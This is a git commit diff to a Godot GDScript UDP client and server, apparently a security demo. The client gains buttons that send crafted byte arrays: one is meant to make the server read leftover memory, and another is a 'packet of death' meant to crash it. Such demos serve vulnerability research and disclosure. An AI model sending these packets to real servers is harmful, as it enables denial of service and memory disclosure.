ecd8a1776fb7ea9bad918fb541b127046deee364
Lukas Zanner <zannix@freenet.de>
2019-06-21 15:14:08 +0200

    Prepare demo

--- Client/main.gd
+++ Client/main.gd
@@ -8,33 +8,33 @@ func _ready():
 
 func _process(delta):
 	while udp.get_available_packet_count() > 0:
-		var received_packet = udp.get_var()
-		print("Server says: '" + received_packet + "'")
+		# Setup output of received data
 		var node = get_node("Panel/MarginContainer/VBoxContainer/RichTextLabel")
 		var text = node.get_text()
-		node.set_text(text + received_packet + "\n")
+		
+		# Read received packet
+		var received_packet = udp.get_var()
+		
+		# Output received data to console and UI
+		print("Server says: '" + received_packet + "'")
+		node.set_text(text + "Server says: '" + received_packet + "'\n")
 
 
-func _on_SendPacketButton_pressed():
-	# Send a default PoolByteArray
-	#udp.put_packet(PoolByteArray([20, 0, 0, 0, 2, 0, 0, 0, 4, 7]))
-	udp.put_var(PoolByteArray([4, 7]))
-	
-	# Send a string
-	#udp.put_var(PoolStringArray(['test1234']))
-	#udp.put_var(PoolByteArray([24, 11, 24, 11, 24, 11, 24, 11, 24]))
-	
-	# Put data into memory
-	#udp.put_packet(PoolByteArray([23, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 72, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100, 33]))
-	#udp.put_packet(PoolByteArray([23, 0, 0, 0, 1, 0, 0, 0, 3, 0, 0, 0, 116, 101, 97]))
+func _on_SendUninitializedStringDataButton_pressed():
+	# Send a string that has uninitialized padded data in it
+	udp.put_var(PoolStringArray(['test1234test1']))
+
+
+func _on_SendUnintializedPoolArrayDataButton_pressed():
+	# Send a pool byte array that has uninitialized padded data in it
+	udp.put_var(PoolByteArray([1, 2, 3, 4, 1, 2, 3, 4, 1]))
+
+
+func _on_SendMaliciousStringDataButton_pressed():
 	# Try to read data that still exists in memory until it is null terminated
-	#udp.put_packet(PoolByteArray([23, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 255]))
-	
-	# Same packet as above but with normal string instead of PoolStringArray
-	#udp.put_packet(PoolByteArray([4, 0, 0, 0, 12, 0, 0, 0, 72, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100, 33]))
-	#udp.put_packet(PoolByteArray([4, 0, 0, 0, 0, 0, 0, 255]))
+	udp.put_packet(PoolByteArray([23, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 255]))
 
 
-func _on_SendMaliciousPacketButton_pressed():
+func _on_SendPacketOfDeathButton_pressed():
 	# Send a packet of death to crash the server
 	udp.put_packet(PoolByteArray([20, 0, 0, 0, 0, 0, 0, 255]))
--- Server/main.gd
+++ Server/main.gd
@@ -8,10 +8,11 @@ var rich_text_label
 func _ready():
 	udp.listen(1025)
 	rich_text_label = get_node("Panel/MarginContainer/RichTextLabel")
+	print("Listening on port 1025...")
 	rich_text_label.set_text("Listening on port 1025...\n")
 	thread.start(self, "thread_func")
 	self.set_process(true)
-	
+
 
 func exit_tree():
 	should_quit = true
@@ -28,12 +29,28 @@ func my_process():
 	if udp.get_available_packet_count() < 1:
 		return
 	else:
+		# Set return destination
+		var client_ip = udp.get_packet_ip()
+		var client_port = udp.get_packet_port()
+		udp.set_dest_address(client_ip, client_port)
+		
+		# Read received packet
 		var text = rich_text_label.get_text()
 		rich_text_label.set_text(text + "UDP packet received!\n")
 		var received_var = udp.get_var()
 		
-		var client_ip = udp.get_packet_ip()
-		var client_port = udp.get_packet_port()
-		udp.set_dest_address(client_ip, client_port)
-		udp.put_var("I received '" + str(received_var) + "'")
-		
+		# Output received data to console and client
+		print("I received:")
+		if typeof(received_var) == TYPE_STRING_ARRAY:
+			var raw_data = str(received_var)
+			
+			print(raw_data)
+			udp.put_var("I received '" + raw_data + "'")
+		elif typeof(received_var) == TYPE_RAW_ARRAY:
+			var tmp_str = ""
+			for element in received_var:
+				tmp_str += str(element) + ","
+			tmp_str = "[ " + tmp_str.substr(0, tmp_str.length() - 1) + " ]"
+			
+			print(tmp_str)
+			udp.put_var("I received '" + tmp_str + "'")
